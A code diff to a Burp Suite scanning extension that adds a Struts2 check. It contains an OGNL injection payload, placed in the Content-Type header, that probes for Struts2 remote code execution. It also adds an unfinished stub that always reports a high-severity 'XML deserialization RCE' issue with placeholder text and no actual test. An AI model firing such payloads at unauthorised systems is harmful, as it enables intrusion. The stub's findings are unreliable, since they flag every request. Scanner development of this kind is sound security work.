@@ -28,7 +28,7 @@ try:
 except ImportError:
     print "Failed to load dependencies. This issue may be caused by using the unstable Jython 2.7 beta."
 
-VERSION = "1.0.14"
+VERSION = "1.0.15"
 FAST_MODE = False
 DEBUG = False
 callbacks = None
@@ -72,6 +72,7 @@ class PerRequestScans(IScannerCheck):
         issues = self.doHostHeaderScan(basePair, base_resp_string, base_resp_print)
         issues.extend(self.doCodePathScan(basePair, base_resp_print))
         issues.extend(self.doStrutsScan(basePair))
+        issues.extend(self.doStrutsXMLScan(basePair))
         return issues
 
 
@@ -103,7 +104,7 @@ class PerRequestScans(IScannerCheck):
         return False
 
     def doStrutsScan(self, basePair):
-
+        
         x = random.randint(999, 9999)
         y = random.randint(999, 9999)
         (ignore, req) = setHeader(basePair.getRequest(), 'Content-Type', "${#context[\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"].addHeader(\"X-Ack\","+str(x)+"*"+str(y)+")}.multipart/form-data", True)
@@ -118,8 +119,14 @@ class PerRequestScans(IScannerCheck):
 
         return []
 
+    def doStrutsXMLScan(self, basePair):
 
-
+        attack = callbacks.makeHttpRequest(basePair.getHttpService(), basePair.getRequest())
+        return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
+            [attack],
+            'Struts2 XML deserialization RCE',
+            "The application appears blah",
+            'Firm', 'High')]
 
     def doCodePathScan(self, basePair, base_resp_print):
         xml_resp, xml_req = self._codepath_attack(basePair, 'application/xml')
